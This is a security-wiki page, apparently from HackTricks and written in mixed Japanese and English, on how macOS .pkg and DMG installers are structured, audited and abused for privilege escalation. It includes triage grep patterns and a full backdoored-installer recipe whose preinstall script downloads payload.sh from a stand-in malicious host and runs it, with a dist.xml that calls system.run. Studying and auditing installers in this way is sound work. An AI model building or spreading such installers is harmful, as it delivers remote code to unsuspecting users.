# macOS Installers Abuse

{{#include ../../../banners/hacktricks-training.md}}

## Pkg Basic Information

macOSの**installer package**（`.pkg`ファイルとも呼ばれます）は、macOSで**softwareを配布**するために使用されるファイル形式です。これらのファイルは、softwareのinstallと正しい実行に必要なすべてを含む**box**のようなものです。

package file自体は、**target** computerにinstallされる**files and directoriesの階層**を格納したarchiveです。また、configuration filesの設定や古いsoftware versionのcleanupなど、installationの前後にタスクを実行する**scripts**を含めることもできます。

### Package Structure

<figure><img src="../../../images/Pasted Graphic.png" alt="https://www.youtube.com/watch?v=iASSG0_zobQ"><figcaption></figcaption></figure>

- **Distribution (xml)**: Customizations（title、welcome textなど）およびscript/installation checks
- **PackageInfo (xml)**: Info、install requirements、install location、実行するscriptsへのpaths
- **Bill of materials (bom)**: file permissions付きの、install、update、またはremoveするfilesのlist
- **Payload (CPIO archive gzip compressed)**: PackageInfoの`install-location`にinstallするfiles
- **Scripts (CPIO archive gzip compressed)**: 実行のためにtemp directoryへextractされる、Pre and post install scriptsなどのresources

### Decompress
```bash
# Tool to directly get the files inside a package
pkgutil --expand "/path/to/package.pkg" "/path/to/out/dir"

# Get the files in a more manual way
mkdir -p "/path/to/out/dir"
cd "/path/to/out/dir"
xar -xf "/path/to/package.pkg"

# Decompress also the CPIO gzip compressed ones
cat Scripts | gzip -dc | cpio -i
cpio -i < Scripts
```
インストーラの内容を手動で解凍せずに確認するには、無料のツール [**Suspicious Package**](https://mothersruin.com/software/SuspiciousPackage/) も利用できます。

### Static triage shortcuts

分析が目的の場合は、まず **`Installer.app` でパッケージを開くのを避ける**ようにしてください。一部のパッケージは、`system.run()` やインストーラのプラグインなどを介して、Installer が開いた時点でコードを実行できます。そのため、通常はオフラインでの抽出から始めるほうが安全です。
```bash
PKG="Suspicious.pkg"
OUT="/tmp/pkg-audit"

# Preserve Distribution, scripts, resources and nested component pkgs
pkgutil --expand-full "$PKG" "$OUT"

# Signature / policy checks
pkgutil --check-signature "$PKG"
spctl -a -vv -t install "$PKG"

# Quick hunting: scripts, BOM contents and interesting primitives
find "$OUT" -type f \( -name preinstall -o -name postinstall \) -print -exec head -n 1 {} \;
find "$OUT" -type f \( -name Bom -o -name '*.bom' \) -exec lsbom -pf {} \; 2>/dev/null
xmllint --format "$OUT/Distribution" 2>/dev/null | sed -n '1,200p'
rg -n 'system\.(run|runOnce)|<script>|launchctl|osascript|curl|chmod 4[0-7]{3}|sudo -u |\$USER|\$HOME|/tmp/|/var/tmp/' "$OUT"
```
## DMG の基本情報

DMG ファイル、つまり Apple Disk Images は、Apple の macOS がディスクイメージに使用するファイル形式です。DMG ファイルは本質的に**マウント可能なディスクイメージ**（独自のファイルシステムを含む）であり、通常は圧縮され、場合によっては暗号化された raw ブロックデータを含みます。DMG ファイルを開くと、macOS は**物理ディスクであるかのようにマウント**するため、その内容にアクセスできます。

> [!CAUTION]
> **`.dmg`** installer は**非常に多くの形式**をサポートしているため、過去には脆弱性を含むものが悪用され、**kernel code execution** の取得に利用されました。

### Disk Image の構造

<figure><img src="../../../images/image (225).png" alt=""><figcaption></figcaption></figure>

DMG ファイルの階層は、内容によって異なる場合があります。ただし、application DMG では通常、次の構造に従います。

- Top Level: これは disk image の root です。通常、application と、Applications folder への link が含まれています。
- Application (.app): これは実際の application です。macOS では、application は通常、application を構成する多数の個別ファイルや folder を含む package です。
- Applications Link: これは macOS の Applications folder への shortcut です。これにより application を簡単に install できます。.app file をこの shortcut に drag すると、app を install できます。

## pkg abuse による Privesc

### public directories からの実行

pre-installation または post-installation script が**`/var/tmp/Installerutil`**のような file を実行し、attacker がその file を置き換えられる場合、installer がそれを呼び出した際に attacker は privileges を escalate できます。引用されている talks と walkthrough では、この insecure な external-script pattern の亜種が示されています。<sup>[[1]](#references)</sup><sup>[[3]](#references)</sup><sup>[[4]](#references)</sup>

<figure><img src="../../../images/Pasted Graphic 5.png" alt="https://www.youtube.com/watch?v=iASSG0_zobQ"><figcaption><p><a href="https://www.youtube.com/watch?v=kCXhIYtODBg">https://www.youtube.com/watch?v=kCXhIYtODBg</a></p></figcaption></figure>

### AuthorizationExecuteWithPrivileges

これは、複数の installer や updater が**root として何かを実行する**ために呼び出す[public function](https://developer.apple.com/documentation/security/1540038-authorizationexecutewithprivileg)です。この function は、実行する**file**の**path**を parameter として受け取ります。しかし、attacker がこの file を**modify**できる場合、root 権限での実行を**abuse**して**privileges を escalate**できます。
```bash
# Breakpoint in the function to check which file is loaded
(lldb) b AuthorizationExecuteWithPrivileges
# You could also check FS events to find this misconfig
```
詳細については、こちらの講演を確認してください: [https://www.youtube.com/watch?v=lTOItyjTTkw](https://www.youtube.com/watch?v=lTOItyjTTkw)<sup>[[8]](#references)</sup>

### Environment と shebang abuse

Modern PackageKit のバグから、installer scripts は、攻撃者が制御可能なコンテキストを近くに保持したまま、**trusted root code** として実行されることが多いと判明しました。vendor packages を監査する際は、次の点に特に注意してください。

- `#!/bin/zsh` / `#!/bin/bash` などの Shell interpreters
- `sudo -u $USER`、`launchctl asuser` などの呼び出し、または `$USER`、`$HOME`、`PATH`、`TMPDIR`、相対パスを信頼するロジック
- ユーザーが制御する init files または libraries を読み込む可能性がある non-shell interpreters
```bash
pkgutil --expand-full Target.pkg /tmp/target-pkg
find /tmp/target-pkg -type f \( -name preinstall -o -name postinstall \) -exec sh -c 'printf "\n### %s\n" "$1"; head -n 1 "$1"' sh {} \;
rg -n '^#!/bin/(zsh|bash)|sudo -u |launchctl asuser|\$USER|\$HOME|PATH=|/usr/bin/env ' /tmp/target-pkg
```
2024 PackageKit root-environment bug（ユーザーが開始したインストール中の `~/.zshenv` / `~/.bash*` の継承）については、[generic macOS privesc page](../macos-privilege-escalation.md) を確認してください。パッケージが **Apple-signed** の場合、`system_installd` が `com.apple.rootless.install.heritable` を持つ可能性があるため、同じスクリプトのバグが **SIP/TCC-relevant** になることがあります。[SIP page](../macos-security-protections/macos-sip.md) を参照してください。<sup>[[5]](#references)</sup><sup>[[6]](#references)</sup>

### mount による実行

インストーラーが `/tmp/fixedname/bla/bla` に書き込む場合、`noowners` を指定して `/tmp/fixedname` に対する **mount を作成**できるため、**インストール中に任意のファイルを変更**してインストールプロセスを悪用できる可能性があります。

この例として **CVE-2021-26089** があり、**periodic script を上書き**して root として実行させることに成功しました。詳細については、次の講演を参照してください：[**OBTS v4.0: "Mount(ain) of Bugs" - Csaba Fitzl**](https://www.youtube.com/watch?v=jSYPazD4VcE)<sup>[[7]](#references)</sup>

## pkg を malware として使用

### Empty Payload

実際の payload は含めず、スクリプト内の malware だけを含む **`.pkg`** ファイルを、**pre and post-install scripts** 付きで生成することが可能です。<sup>[[2]](#references)</sup>

### Distribution xml 内の JS

パッケージの **distribution xml** ファイルに **`<script>`** タグを追加でき、そのコードが実行されます。また、**`system.run`** を使用して **commands を実行**できます。

<figure><img src="../../../images/image (1043).png" alt=""><figcaption></figcaption></figure>

distribution packages では、通常、これはトップレベルの `Distribution` ファイルで外部スクリプトを有効にする設定に依存します。たとえば、`allow-external-scripts="true"` などです。したがって、`preinstall` / `postinstall` だけを確認するのでは不十分です。**Distribution XML 自体**に `installation-check` / `volume-check` hooks や、`system.run()` / `system.runOnce()` を直接実行する経路が含まれている可能性があります。
```bash
xmllint --format Distribution | sed -n '1,200p'
rg -n 'allow-external-scripts|system\.(run|runOnce)|installation-check|volume-check|function ' Distribution
```
### バックドア化された Installer

dist.xml 内の script と JS code を使用する悪意のある Installer
```bash
# Package structure
mkdir -p pkgroot/root/Applications/MyApp
mkdir -p pkgroot/scripts

# Create preinstall scripts
cat > pkgroot/scripts/preinstall <<EOF
#!/bin/bash
echo "Running preinstall script"
curl -o /tmp/payload.sh http://malicious.site/payload.sh
chmod +x /tmp/payload.sh
/tmp/payload.sh
exit 0
EOF

# Build package
pkgbuild --root pkgroot/root --scripts pkgroot/scripts --identifier com.malicious.myapp --version 1.0 myapp.pkg

# Generate the malicious dist.xml
cat > ./dist.xml <<EOF
<?xml version="1.0" encoding="utf-8"?>
<installer-gui-script minSpecVersion="1">
<title>Malicious Installer</title>
<options allow-external-scripts="true" customize="allow" require-scripts="true"/>
<script>
<![CDATA[
function installationCheck() {
if (system.isSandboxed()) {
my.result.title = "Cannot install in a sandbox.";
my.result.message = "Please run this installer outside of a sandbox.";
return false;
}
return true;
}
function volumeCheck() {
return true;
}
function preflight() {
system.run("/path/to/preinstall");
}
function postflight() {
system.run("/path/to/postinstall");
}
]]>
</script>
<choices-outline>
<line choice="default">
<line choice="myapp"/>
</line>
</choices-outline>
<choice id="myapp" title="MyApp">
<pkg-ref id="com.malicious.myapp"/>
</choice>
<pkg-ref id="com.malicious.myapp" installKBytes="0" auth="root">#myapp.pkg</pkg-ref>
</installer-gui-script>
EOF

# Build final
productbuild --distribution dist.xml --package-path myapp.pkg final-installer.pkg
```
## References

- [1] [DEF CON 27 - Pkgsのアンパッキング：macOS Installer Packagesの内部と一般的なセキュリティ上の欠陥を見る](https://www.youtube.com/watch?v=iASSG0_zobQ)
- [2] [OBTS v4.0: 「macOS Installersのワイルドな世界」 - Tony Lambert](https://www.youtube.com/watch?v=Eow5uNHtmIg)
- [3] [DEF CON 27 - Pkgsのアンパッキング：macOS Installer Packagesの内部を見る](https://www.youtube.com/watch?v=kCXhIYtODBg)
- [4] [RedTeamRecipe – macOS Red Teaming: Installer Packagesの悪用](https://redteamrecipe.com/macos-red-teaming?utm_source=pocket_shared#heading-exploiting-installer-packages)
- [5] [CVE-2024-27822: macOS PackageKitのPrivilege Escalation](https://khronokernel.com/macos/2024/06/03/CVE-2024-27822.html)
- [6] [Apple-signed PackagesでSIPを破る](https://www.l3harris.com/newsroom/editorial/2024/03/breaking-sip-apple-signed-packages)
- [7] [OBTS v4.0: 「Mount(ain) of Bugs」 - Csaba Fitzl](https://www.youtube.com/watch?v=jSYPazD4VcE)
- [8] [DEF CON 25 - Patrick Wardle - macOSで1000個のInstallersに殺される、そしてすべてが壊れている！](https://www.youtube.com/watch?v=lTOItyjTTkw)
{{#include ../../../banners/hacktricks-training.md}}
